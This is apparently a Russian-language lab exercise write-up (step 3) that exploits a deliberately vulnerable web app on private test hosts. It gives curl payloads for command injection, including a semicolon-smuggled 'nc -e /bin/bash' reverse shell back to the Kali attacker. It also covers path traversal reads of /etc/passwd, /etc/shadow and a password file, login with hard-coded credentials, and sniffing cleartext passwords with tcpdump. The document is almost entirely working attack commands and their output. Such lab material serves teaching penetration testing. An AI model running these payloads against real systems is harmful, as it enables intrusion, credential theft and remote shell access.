                                                             🗡️ Шаг 3: Эксплуатация уязвимостей

                                                           Уязвимость 1: Command Injection (CWE-20)

Описание: Приложение не валидирует ввод при выполнении системных команд.

Эксплуатация (с Kali 10.0.0.2):

```bash
# Проверка выполнения команды id
curl "http://10.0.0.1:8888/api/ping?host=127.0.0.1;id"
```

Результат:
```
uid=1000(app) gid=1000(app) groups=1000(app)
```

```bash
# Выполнение произвольной команды
curl "http://10.0.0.1:8888/api/ping?host=127.0.0.1;cat+/etc/passwd"
```

Результат:
```
root:x:0:0:root:/root:/bin/bash
system:x:1000:1000:system:/home/system:/bin/bash
...
```

Получение обратного шелла:

```bash
# 1. На Kali запускаем слушатель
nc -lvnp 4444

# 2. В другом терминале Kali отправляем команду
curl "http://10.0.0.1:8888/api/ping?host=127.0.0.1;nc+-e+/bin/bash+10.0.0.2+4444"
```

Результат: В терминале с `nc -lvnp 4444` появляется доступ к шеллу Ubuntu.

---

                                                               Уязвимость 2: Path Traversal (CWE-22)

Описание: Отсутствие ограничений на доступ к файловой системе.

Эксплуатация (с Kali 10.0.0.2):

```bash
# Чтение файла с паролем
curl "http://10.0.0.1:8888/api/file?path=../../../../opt/sk/password.txt"
```

Результат:
```
admin:gH5kL9mN2pQ7
```

```bash
# Чтение системного файла /etc/passwd
curl "http://10.0.0.1:8888/api/file?path=../../../../etc/passwd"
```

Результат:
```
root:x:0:0:root:/root:/bin/bash
system:x:1000:1000:system:/home/system:/bin/bash
...
```

```bash
# Чтение теневого файла паролей
curl "http://10.0.0.1:8888/api/file?path=../../../../etc/shadow"
```

Результат:
```
root:$6$xyz...:18754:0:99999:7:::
system:$6$abc...:18754:0:99999:7:::
```

```bash
# Чтение конфигурации приложения
curl "http://10.0.0.1:8888/api/file?path=../../../../opt/sk/config.json"
```

Результат: Получена конфигурация приложения.

                                                    Уязвимость 3: Hard-coded Credentials (CWE-798)

Описание: Пароль администратора хранится в открытом виде в файле.

Эксплуатация (с Ubuntu 10.0.0.1):

```bash
cat /opt/sk/password.txt
```

Результат:
```
admin:gH5kL9mN2pQ7
```

Использование пароля для входа (с Kali 10.0.0.2):

```bash
curl -X POST http://10.0.0.1:8888/login \
  -d "username=admin&password=gH5kL9mN2pQ7"
```

Результат: Успешный вход и получение сессионного токена.

---

                                                    Уязвимость 4: Insufficiently Protected Credentials (CWE-522)

Описание: Передача пароля по HTTP в открытом виде.

Эксплуатация (с Kali 10.0.0.2):

```bash
# 1. Запускаем перехват трафика
sudo tcpdump -i eth1 -A port 8888

# 2. В другом терминале отправляем запрос на логин
curl -X POST http://10.0.0.1:8888/login \
  -d "username=admin&password=gH5kL9mN2pQ7"
```

Результат: В выводе `tcpdump` виден пароль в открытом виде.

---

                                                      Уязвимость 5: Отсутствие аутентификации (CWE-306)

Описание: Доступ к API без авторизации.

Эксплуатация (с Kali 10.0.0.2):

```bash
curl "http://10.0.0.1:8888/api/config"
```

Результат: Получение конфигурации без входа в систему.
